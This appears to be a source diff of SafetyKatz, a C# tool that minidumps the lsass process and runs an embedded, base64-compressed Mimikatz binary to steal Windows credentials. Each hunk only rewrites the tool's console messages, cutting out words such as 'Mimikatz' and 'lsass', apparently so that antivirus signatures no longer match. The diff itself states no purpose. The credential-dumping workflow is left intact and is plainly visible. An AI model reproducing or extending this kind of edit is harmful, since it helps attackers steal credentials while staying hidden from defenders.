@@ -54,7 +54,7 @@ namespace SafetyKatz
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
+                Console.WriteLine(String.Format("\n[X] Error get handle {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                 return;
             }
             bool bRet = false;
@@ -72,11 +72,11 @@ namespace SafetyKatz
             // if successful
             if (bRet)
             {
-                Console.WriteLine("[+] Dump successful!");
+                Console.WriteLine("[+] Dump good!");
             }
             else
             {
-                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
+                Console.WriteLine(String.Format("[X] D failed: {0}", bRet));
             }
         }
 
@@ -84,7 +84,7 @@ namespace SafetyKatz
         {
             if (!IsHighIntegrity())
             {
-                Console.WriteLine("\n[X] Not in high integrity, unable to grab a handle to lsass!\n");
+                Console.WriteLine("\n[X] Not high integ, unable handle to lsas!\n");
             }
             else
             {
@@ -99,7 +99,7 @@ namespace SafetyKatz
 
                 if (!(IntPtr.Size == 8))
                 {
-                    Console.WriteLine("\n[X] Process is not 64-bit, this version of Mimikatz won't work yo'!\n");
+                    Console.WriteLine("\n[X] Process is not 64-bit, this version of M won't work yo'!\n");
                     return;
                 }
 
@@ -107,7 +107,7 @@ namespace SafetyKatz
                 // first minidump the process
                 Minidump();
 
-                // now decompress the customized Mimikatz binary from Constants.cs
+                // now decompress the customized M binary from Constants.cs
                 Byte[] unpacked = new byte[628736];
                 using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(Constants.compressedMimikatzString)))
                 {
@@ -223,7 +223,7 @@ namespace SafetyKatz
                 }
 
                 // Transfer Control To OEP
-                Console.WriteLine("\n[*] Executing loaded Mimikatz PE");
+                Console.WriteLine("\n[*] Executing loaded M PE");
 
                 string[] fakeArgs = { "privilege::debug" };
                 args = fakeArgs;
